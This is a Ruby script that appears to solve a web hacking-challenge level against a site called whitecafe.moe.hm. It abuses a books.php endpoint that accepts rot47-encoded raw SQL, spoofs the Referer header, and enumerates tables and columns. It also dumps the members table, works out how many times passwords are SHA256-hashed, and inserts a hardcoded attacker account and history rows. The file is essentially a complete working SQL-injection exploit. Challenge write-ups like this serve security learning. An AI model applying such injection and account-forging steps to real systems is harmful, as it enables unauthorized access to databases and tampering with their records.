#!/usr/bin/ruby
#This code is really based on http://www.hackerschool.jp/hack/reference.php
USER='535443uunEm'
PASSWORD='Pbb655AP'

require 'cgi'
require 'digest/sha2'
require 'net/http'
class String
	def escape() CGI.escape(self) end
	def unescape() CGI.unescape(self) end
	def rot13
		former='abcdefghijklmABCDEFGHIJKLM'
		latter='nopqrstuvwxyzNOPQRSTUVWXYZ'
		self.tr(former+latter,latter+former)
	end
	def rot47
		self.bytes.map{|e|(33<=e&&e<=79 ? e+47 : 80<=e&&e<=126 ? e-47 : e).chr}*''
	end
	def sha256_iter(n)
		str=self
		n.times{ str=Digest::SHA256.hexdigest(str) }
		str
	end
end
def parsehtml(str)
	a=str.split('<tbody>')[1].split('<tr')
	a.shift
	a.map{|e|
		e.tr("\n","")=~/\<td\>\s*(.*?)\s*\<\/td\>/
		$1[3..-1] #Strip "BK-"
	}
end
def parsehtml_withouterr(str)
	a=str.split('<tbody>')[1].split('<tr').reject{|e|e.include?("error")}
	a.shift
	a.map{|e|
		e.tr("\n","")=~/\<td\>\s*(.*?)\s*\<\/td\>/
		$1[3..-1] #Strip "BK-"
	}
end

Net::HTTP.start('whitecafe.moe.hm'){|http|
#Stage1
#puts "%24t%7Btr%25+Y+u%23~%7C+13%40%40%3CD1+%28wt%23t+152E61+ml+%60badbcbe__+p%7Ds+152E61+kl+%60bdehee___+~%23st%23+q%2A+1%3F2%3E61+p%24rj".unescape.rot47

puts "Firstly, after fixing the Referer to http://whitecafe.moe.hm/, try to open (not performed here):"
puts "http://whitecafe.moe.hm/books.php?sql="+"SELECT * FROM books;".rot47.escape

puts "Nextly, table names can be obtained via:"
puts "http://whitecafe.moe.hm/books.php?sql="+"SHOW tables;".rot47.escape
resp=http.get("/books.php?sql="+"SHOW tables;".rot47.escape,{'Referer'=>'http://whitecafe.moe.hm/'})
puts "[+] "+parsehtml(resp.body)*", " #books, history, members, points, shame

puts "Now, books table columns can be obtained via:"
puts "http://whitecafe.moe.hm/books.php?sql="+"SHOW FIELDS FROM books;".rot47.escape
resp=http.get("/books.php?sql="+"SHOW FIELDS FROM books;".rot47.escape,{'Referer'=>'http://whitecafe.moe.hm/'})
puts "[+] "+parsehtml(resp.body)*", " #book_id, name, author, publisher, date, scrap

puts "Also member table columns can be obtained via:"
puts "http://whitecafe.moe.hm/books.php?sql="+"SHOW FIELDS FROM members;".rot47.escape
resp=http.get("/books.php?sql="+"SHOW FIELDS FROM members;".rot47.escape,{'Referer'=>'http://whitecafe.moe.hm/'})
puts "[+] "+parsehtml(resp.body)*", " #member_id, user, password

puts "You don't know your member_id. You can find unduplicated one via:"
puts "http://whitecafe.moe.hm/books.php?sql="+"SELECT * FROM members;".rot47.escape
resp=http.get("/books.php?sql="+"SELECT * FROM members;".rot47.escape,{'Referer'=>'http://whitecafe.moe.hm/'})
a=parsehtml(resp.body).map(&:to_i)
i=1
i+=1 while a.include?(i)
puts "Found. ID=#{i}."
ID=i

puts "By the way, it seems '8946' is hashed into 063911792e563a9e513bfa3ff7c5949ff217e221b963683ca96cd8b651d20c3f."
puts "Let's see how many times we should iterate SHA256."
i=0
str='8946'
while str!='063911792e563a9e513bfa3ff7c5949ff217e221b963683ca96cd8b651d20c3f'
	str=Digest::SHA256.hexdigest(str)
	i+=1
end
puts "#{i} times."

puts "Now inject your account using:"
puts "http://whitecafe.moe.hm/books.php?sql="+"INSERT INTO members (member_id,user,password) VALUES (#{ID},'#{USER}','#{PASSWORD.sha256_iter(i)}');".rot47.escape
http.get("/books.php?sql="+"INSERT INTO members (member_id,user,password) VALUES (#{ID},'#{USER}','#{PASSWORD.sha256_iter(i)}');".rot47.escape,{'Referer'=>'http://whitecafe.moe.hm/'})

#Stage2
puts "Now you have an account on whitecafe. Let's see history."
puts "http://whitecafe.moe.hm/books.php?sql="+"DESCRIBE history;".rot47.escape
resp=http.get("/books.php?sql="+"DESCRIBE history;".rot47.escape,{'Referer'=>'http://whitecafe.moe.hm/'})
puts "[+] "+parsehtml(resp.body)*", " #history_id, member_id, book_id, date

#note: well, how can I know scrap column's role without using magic? lol
puts "Finally let's hack database."
resp=http.get("/books.php?sql="+"SELECT * FROM books where scrap=0 ORDER BY date ASC LIMIT 100;".rot47.escape,{'Referer'=>'http://whitecafe.moe.hm/'})
#parsehtml_withouterr(resp.body)[0,100]
parsehtml(resp.body).each_with_index{|e,i|
	puts "Sending #{e} (#{i+1})..."
	http.get("http://whitecafe.moe.hm/books.php?sql="+"INSERT INTO history (member_id,book_id,date) VALUES (#{ID},#{e}, UNIX_TIMESTAMP(NOW()));".rot47.escape,{'Referer'=>'http://whitecafe.moe.hm/'})
}
}